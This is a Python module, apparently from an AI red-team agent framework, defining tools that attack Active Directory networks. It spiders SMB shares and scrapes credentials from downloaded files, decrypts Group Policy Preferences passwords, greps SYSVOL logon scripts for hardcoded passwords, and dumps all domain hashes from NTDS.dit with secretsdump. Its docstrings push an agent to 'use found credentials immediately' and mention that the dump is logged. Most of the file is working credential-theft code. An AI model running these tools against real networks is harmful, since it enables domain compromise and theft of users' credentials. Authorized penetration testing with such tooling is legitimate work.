"""Share pilfering tools for searching SMB shares for credentials.

This module provides tools for:
- Spidering SMB shares for interesting files
- Finding Group Policy Preferences passwords (MS14-025)
- Searching SYSVOL scripts for plaintext passwords
- Extracting NTDS.dit database
"""

import logging
import re
from typing import Any, ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import Credential
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    add_credential_to_state,
    fetch_remote_file,
    resolve_password,
    run_tool,
    store_remote_artifact,
)

logger = logging.getLogger(__name__)


class SharePilferingTools(Toolset):
    """Tools for searching SMB shares for sensitive files and credentials."""

    state: AnyRedTeamState | None = None
    dispatcher: Any | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def set_dispatcher(self, dispatcher) -> None:
        self.dispatcher = dispatcher

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_credential(
        self,
        username: str,
        password: str,
        domain: str,
        source: str,
        is_admin: bool = False,
    ) -> None:
        if not self.state or not username:
            return
        cred = Credential(
            username=username,
            password=password,
            domain=domain,
            source=source,
            is_admin=is_admin,
        )
        add_credential_to_state(self.state, cred, "credential_access", self.dispatcher)

    @dn.tool_method
    def smbclient_spider(  # noqa: PLR0912
        self,
        target: str,
        share: str,
        username: str,
        password: str,
        domain: str,
        pattern: str = "*.txt,*.xml,*.ini,*.cfg,*.ps1,*.bat,*.cmd,*.kdbx,*.config",
        depth: int = 5,
    ) -> str:
        """
        Spider an SMB share for interesting files containing credentials.

        Searches recursively through shares looking for configuration files,
        scripts, and other files that commonly contain credentials.

        Args:
            target: Target host IP
            share: Share name to spider
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication
            pattern: File patterns to search for (comma-separated)
            depth: Maximum directory depth to search

        Returns:
            List of interesting files found

        Example:
            >>> smbclient_spider("192.168.58.10", "SYSVOL", "user", "pass", "domain.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Deduplication: check if this target/share/credential combo was already spidered
        if self.state and hasattr(self.state, "processed_spidered_shares"):
            spider_key = (
                f"{target.lower()}:{share.lower()}:{username.lower()}:{(domain or '').lower()}"
            )
            if spider_key in self.state.processed_spidered_shares:
                return (
                    f"[*] Already spidered {share} on {target} with {domain}\\{username} - skipping"
                )
            self.state.processed_spidered_shares.add(spider_key)

        cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "spider_plus",
            "-o",
            "DOWNLOAD_FLAG=True",  # Enable file downloads
            "MAX_FILE_SIZE=102400",  # Download files up to 100KB (in bytes)
        ]

        try:
            logger.info(f"[*] Spidering share {share} on {target} with downloads enabled")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Fetch spider JSON metadata from recon pod (spider_plus runs on recon)
            import json

            spider_dir = "/root/.nxc/modules/nxc_spider_plus"
            json_file = f"{spider_dir}/{target}.json"

            downloaded_content = []

            # Fetch the JSON metadata from recon pod
            json_bytes = fetch_remote_file(json_file, target_role="recon", timeout_seconds=30)
            if json_bytes:
                try:
                    spider_data = json.loads(json_bytes.decode("utf-8", errors="ignore"))

                    # Look for downloaded files in each share
                    for share_name, share_data in spider_data.items():
                        if isinstance(share_data, dict):
                            for file_path, file_info in share_data.items():
                                if (
                                    isinstance(file_info, dict)
                                    and file_info.get("size", 0) < 102400
                                ):  # <100KB
                                    # Fetch downloaded file from recon pod
                                    # spider_plus downloads to: spider_dir/IP/SHARE/path
                                    clean_path = file_path.lstrip("/\\").replace("\\", "/")
                                    dl_path = f"{spider_dir}/{target}/{share_name}/{clean_path}"

                                    file_bytes = fetch_remote_file(
                                        dl_path, target_role="recon", timeout_seconds=30
                                    )
                                    if file_bytes:
                                        try:
                                            content = file_bytes.decode("utf-8", errors="ignore")
                                            downloaded_content.append(
                                                f"\n📄 FILE: {share_name}/{file_path}\n{'=' * 60}\n{content}\n{'=' * 60}"
                                            )

                                            # Check for credentials in the content
                                            content_lower = content.lower()
                                            if any(
                                                kw in content_lower
                                                for kw in [
                                                    "password",
                                                    "pwd",
                                                    "credential",
                                                    "secret",
                                                    "pass=",
                                                ]
                                            ):
                                                downloaded_content.append(
                                                    f"⚠️ POTENTIAL CREDENTIALS FOUND IN {file_path}!"
                                                )

                                                # Auto-extract credentials if possible
                                                self._extract_credentials_from_content(
                                                    content, share_name, file_path
                                                )
                                        except Exception as e:
                                            logger.debug(f"Could not decode {dl_path}: {e}")
                except Exception as e:
                    logger.debug(f"Could not parse spider JSON from recon: {e}")

            interesting_extensions = [".txt", ".xml", ".ini", ".cfg", ".ps1", ".config", ".kdbx"]
            interesting_files = []
            for line in result.splitlines():
                for ext in interesting_extensions:
                    if ext in line.lower():
                        interesting_files.append(line.strip())
                        break

            if interesting_files:
                result = (
                    "📁 INTERESTING FILES FOUND:\n"
                    + "\n".join(interesting_files[:50])
                    + "\n\n"
                    + result
                )

            # Append downloaded file contents
            if downloaded_content:
                result += "\n\n🔍 DOWNLOADED FILE CONTENTS:\n" + "\n".join(downloaded_content)

            return result

        except Exception as e:
            return f"Share spider failed: {e}"

    def _extract_credentials_from_content(
        self, content: str, share_name: str, file_path: str
    ) -> None:
        """Try to extract credentials from file content and add to state."""
        # Common patterns for credentials in config files
        patterns = [
            # user:password or user=password
            r'(?:user(?:name)?|login)\s*[=:]\s*["\']?([^\s"\']+)["\']?\s*(?:password|passwd|pwd|pass)\s*[=:]\s*["\']?([^\s"\']+)["\']?',
            # password for user patterns
            r'(?:password|passwd|pwd|pass)\s*(?:for\s+)?["\']?([^\s"\']+)["\']?\s*[=:]\s*["\']?([^\s"\']+)["\']?',
            # SQL connection strings
            r"User\s*Id\s*=\s*([^;]+);\s*Password\s*=\s*([^;]+)",
            # Key=value in separate lines (common in INI files)
            r"username\s*=\s*([^\r\n]+)[\r\n]+.*?password\s*=\s*([^\r\n]+)",
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                groups = match.groups()
                if len(groups) >= 2:
                    username = groups[0].strip().strip("\"'")
                    password = groups[1].strip().strip("\"'")
                    if username and password and len(password) > 2:
                        logger.info(
                            f"🔑 Extracted credential from {share_name}/{file_path}: {username}"
                        )
                        cred = Credential(
                            username=username,
                            password=password,
                            domain=self.state.target.domain
                            if self.state and self.state.target
                            else "",
                            source=f"share_spider:{share_name}/{file_path}",
                        )
                        add_credential_to_state(self.state, cred, "share_spider", self.dispatcher)

    @dn.tool_method
    def gpp_password_finder(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Search for Group Policy Preferences passwords (MS14-025).

        GPP passwords were encrypted with a known AES key and can be trivially
        decrypted. Common in older environments or those that haven't been cleaned up.

        Args:
            target: Domain controller IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication

        Returns:
            Decrypted GPP passwords if found

        Example:
            >>> gpp_password_finder("192.168.58.10", "user", "pass", "domain.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "gpp_password",
        ]

        try:
            logger.info(f"[*] Searching for GPP passwords in {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)

            result = stdout + "\n" + (stderr or "")

            if "password" in result.lower() or "cpassword" in result.lower():
                logger.warning("[!] GPP passwords found!")
                result = (
                    "🚨 GPP PASSWORDS FOUND!\n"
                    "\u2192 These are decrypted Group Policy Preferences passwords\n"
                    "\u2192 Use found credentials immediately\n\n" + result
                )

            return result

        except Exception as e:
            return f"GPP password search failed: {e}"

    @dn.tool_method
    def sysvol_script_search(  # noqa: PLR0912
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Search SYSVOL scripts for plaintext passwords (LOW HANGING FRUIT).

        SYSVOL often contains logon scripts, batch files, and PowerShell scripts
        with hardcoded credentials. This is a common misconfiguration in AD environments.

        **RUN THIS EARLY** - Very high success rate in environments with legacy scripts.

        Args:
            target: Domain controller IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication

        Returns:
            Scripts containing potential credentials

        Example:
            >>> sysvol_script_search("192.168.58.10", "user", "pass", "domain.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Deduplication: check if SYSVOL was already searched with this credential
        if self.state and hasattr(self.state, "processed_spidered_shares"):
            spider_key = f"{target.lower()}:sysvol:{username.lower()}:{(domain or '').lower()}"
            if spider_key in self.state.processed_spidered_shares:
                return (
                    f"[*] Already searched SYSVOL on {target} with {domain}\\{username} - skipping"
                )
            self.state.processed_spidered_shares.add(spider_key)

        results: list[str] = []

        # Use netexec spider to search SYSVOL for script files
        # Spider SYSVOL share looking for scripts with password-related content
        spider_cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "spider_plus",
            "-o",
            "EXCLUDE_DIR=Policies",  # Skip policies (covered by gpp_password)
        ]

        try:
            logger.info(f"[*] Searching SYSVOL scripts for passwords in {domain}")

            # First, enumerate and download scripts from SYSVOL/scripts folder
            script_extensions = ["*.bat", "*.cmd", "*.ps1", "*.vbs", "*.wsf", "*.inf"]

            # Use Linux smbclient (not Impacket's smbclient.py) which supports -c flag
            # Use native smbclient (available on credential-access pod)
            sysvol_share = f"//{target}/SYSVOL"
            scripts_path = f"{domain}/scripts"

            for ext in script_extensions:
                # List files matching extension in scripts folder
                list_cmd = [
                    "smbclient",
                    sysvol_share,
                    "-U",
                    f"{domain}/{username}%{resolved_password}",
                    "-c",
                    f"cd {scripts_path}; ls {ext}",
                ]
                stdout, stderr, returncode = run_tool(list_cmd, timeout_seconds=60)
                output = stdout + "\n" + (stderr or "")

                # Skip if access denied or share not found
                if returncode != 0 and (
                    "NT_STATUS_ACCESS_DENIED" in output or "NT_STATUS_" in output
                ):
                    continue

                # Extract script filenames from smbclient output
                # smbclient lists files like: "  filename.bat                     A     1234  Mon Jan 1 12:00:00 2024"
                script_files: list[str] = []
                for line in output.splitlines():
                    line_stripped = line.strip()
                    if not line_stripped or line_stripped.startswith("NT_STATUS"):
                        continue
                    # Match lines with file attributes (A = archive, etc.)
                    if ext.replace("*", "") in line_stripped.lower():
                        # First non-whitespace token is the filename
                        parts = line_stripped.split()
                        if parts and not parts[0].startswith("."):
                            script_files.append(parts[0])

                # Download and search each script for passwords
                for script_file in script_files[:20]:  # Limit to prevent timeout
                    get_cmd = [
                        "smbclient",
                        sysvol_share,
                        "-U",
                        f"{domain}/{username}%{resolved_password}",
                        "-c",
                        f"cd {scripts_path}; get {script_file} /tmp/sysvol_script.txt",
                    ]
                    run_tool(get_cmd, timeout_seconds=30)

                    # Store the downloaded script as a shared artifact for all agents
                    if self.state:
                        artifact_key = f"sysvol/{domain}/{script_file}"
                        store_remote_artifact(
                            self.state,
                            "/tmp/sysvol_script.txt",  # noqa: S108  # nosec B108 - remote pod path
                            artifact_key,
                            source_agent="credential_discovery",
                        )

                    # Search the downloaded file for password patterns
                    # Also capture $user lines so multi-line credential extraction works
                    grep_cmd = [
                        "bash",
                        "-lc",
                        "grep -iE '(password|passwd|pwd|cred|secret|user|username|usr)\\s*[=:]' /tmp/sysvol_script.txt 2>/dev/null || true",
                    ]
                    grep_stdout, _grep_stderr, _ = run_tool(grep_cmd, timeout_seconds=10)
                    grep_output = grep_stdout.strip()

                    if grep_output:
                        results.append(f"\n📄 {script_file}:\n{grep_output}")

            # Also use netexec's spider to find any files with passwords
            stdout, stderr, _ = run_tool(spider_cmd, timeout_seconds=300)
            spider_output = stdout + "\n" + (stderr or "")

            # Combine results
            if results:
                credential_output = "\n".join(results)
                logger.warning("[!] Potential passwords found in SYSVOL scripts!")

                # Try to extract specific credentials
                for line in credential_output.splitlines():
                    # Look for patterns like: net use * \\server\share /user:domain\user password
                    net_use_match = re.search(
                        r"/user:([^\s]+)\s+([^\s]+)",
                        line,
                        re.IGNORECASE,
                    )
                    if net_use_match:
                        found_user = net_use_match.group(1)
                        found_pass = net_use_match.group(2)
                        if "\\" in found_user:
                            found_domain, found_user = found_user.rsplit("\\", 1)
                        else:
                            found_domain = domain
                        self._add_credential(
                            found_user,
                            found_pass,
                            found_domain,
                            "sysvol_script",
                        )

                    # Look for patterns like: password=value, pwd:value, $password="value"  # pragma: allowlist secret
                    pwd_match = re.search(
                        r"(?:\$?(?:password|passwd|pwd))\s*[=:]\s*[\"']?([^\s\"']+)[\"']?",
                        line,
                        re.IGNORECASE,
                    )
                    if pwd_match:
                        found_pass = pwd_match.group(1)
                        # Look for associated username - first on same line
                        user_match = re.search(
                            r"(?:\$?(?:user|username|usr))\s*[=:]\s*[\"']?([^\s\"']+)[\"']?",
                            line,
                            re.IGNORECASE,
                        )
                        # If not found on same line, search full output (handles multi-line scripts)
                        if not user_match:
                            user_match = re.search(
                                r"(?:\$?(?:user|username|usr))\s*[=:]\s*[\"']?([^\s\"']+)[\"']?",
                                credential_output,
                                re.IGNORECASE,
                            )
                        if user_match:
                            found_user = user_match.group(1)
                            # Handle DOMAIN\user format
                            if "\\" in found_user:
                                found_domain, found_user = found_user.rsplit("\\", 1)
                            else:
                                found_domain = domain
                            self._add_credential(
                                found_user,
                                found_pass,
                                found_domain,
                                "sysvol_script",
                            )

                return (
                    "🚨 POTENTIAL PASSWORDS FOUND IN SYSVOL SCRIPTS!\n"
                    "\u2192 Review the following files for credentials\n"
                    "\u2192 Check for net use, runas, or variable assignments\n\n"
                    + credential_output
                    + "\n\nSpider output:\n"
                    + spider_output
                )

            return (
                "[*] No obvious passwords found in SYSVOL scripts.\n"
                "Spider output:\n" + spider_output
            )

        except Exception as e:
            return f"SYSVOL script search failed: {e}"

    @dn.tool_method
    def ntds_dit_extract(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
    ) -> str:
        """
        Extract NTDS.dit database for offline hash extraction.

        This extracts the Active Directory database which contains all domain
        user hashes. Use when you have Domain Admin access.

        **WARNING**: This is very noisy and will be logged. Use secretsdump first.

        Args:
            target: Domain controller IP
            username: Domain Admin username
            password: Password (optional if using hash)
            hash: NTLM hash (optional if using password)
            domain: Domain name

        Returns:
            NTDS extraction results

        Example:
            >>> ntds_dit_extract("192.168.58.10", "Administrator", password="P@ss", domain="domain.local")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if resolved_password and domain:
            target_string = f"{domain}/{username}:{resolved_password}@{target}"
        elif resolved_password:
            target_string = f"{username}:{resolved_password}@{target}"
        elif hash and domain:
            target_string = f"{domain}/{username}@{target}"
        elif hash:
            target_string = f"{username}@{target}"
        else:
            return "[!] Error: Either password or hash must be provided"

        cmd = ["impacket-secretsdump", "-ntds", "drsuapi"]
        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        cmd.append(target_string)

        try:
            logger.info(f"[*] Extracting NTDS.dit from {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=600)

            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"NTDS extraction failed: {e}"
